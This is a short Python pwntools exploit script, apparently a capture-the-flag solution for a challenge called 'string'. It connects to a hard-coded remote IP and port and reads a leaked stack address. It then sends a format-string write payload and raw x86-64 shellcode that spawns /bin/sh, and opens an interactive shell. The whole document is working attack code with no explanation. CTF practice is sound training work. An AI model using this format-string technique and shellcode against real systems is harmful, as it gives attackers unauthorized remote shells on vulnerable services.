from pwn import *
#context.log_level = 'debug'
h,p = "111.200.241.244",54973
p = remote(h,p)
#p = process("./string")
p.recvuntil("secret[0] is ")
v4_addr = p.recvuntil("\n")
print v4_addr
v4_addr = v4_addr.replace("\n",'')
v4_addr = int(v4_addr,16)
print type(v4_addr)
print v4_addr
p.sendlineafter("name be:\n","AAA")
p.sendlineafter("up?:\n","east")
p.sendlineafter("leave(0)?:\n","1")
p.sendlineafter("an address'\n",str(v4_addr))
#wish = "AAAA"+"%x."*10
#print wish
wish = "%85x%7$n"
#gdb.attach("string")
p.sendlineafter("you wish is:\n",wish)
#shellcode = asm(shellcraft.adm64.sh())
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
p.sendlineafter("SPELL\n",shellcode)
p.interactive()
